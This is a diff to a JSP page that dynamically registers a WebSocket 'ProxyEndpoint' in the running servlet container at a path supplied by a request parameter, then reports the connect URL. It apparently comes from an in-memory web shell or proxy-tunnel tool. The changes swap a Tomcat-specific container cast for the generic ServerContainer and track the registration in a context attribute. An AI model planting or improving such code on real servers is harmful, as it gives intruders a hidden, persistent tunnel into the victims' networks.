@@ -9,7 +9,6 @@
 <%@ page import="java.net.InetSocketAddress" %>
 <%@ page import="java.util.concurrent.TimeUnit" %>
 <%@ page import="java.util.concurrent.Future" %>
-<%@ page import="org.apache.tomcat.websocket.server.WsServerContainer" %>
 <%!
     public static class ProxyEndpoint extends Endpoint {
         long i =0;
@@ -108,12 +107,14 @@
     String path = request.getParameter("path");
     ServletContext servletContext = request.getSession().getServletContext();
     ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(ProxyEndpoint.class, path).build();
-    WsServerContainer container = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
+    ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
     try {
-        if (null == container.findMapping(path)) {
+        if (servletContext.getAttribute(path) == null){
             container.addEndpoint(configEndpoint);
+            servletContext.setAttribute(path,path);
         }
-    } catch (DeploymentException e) {
+        out.println("success, connect url path: " + servletContext.getContextPath() + path);
+    } catch (Exception e) {
         out.println(e.toString());
     }
 %>
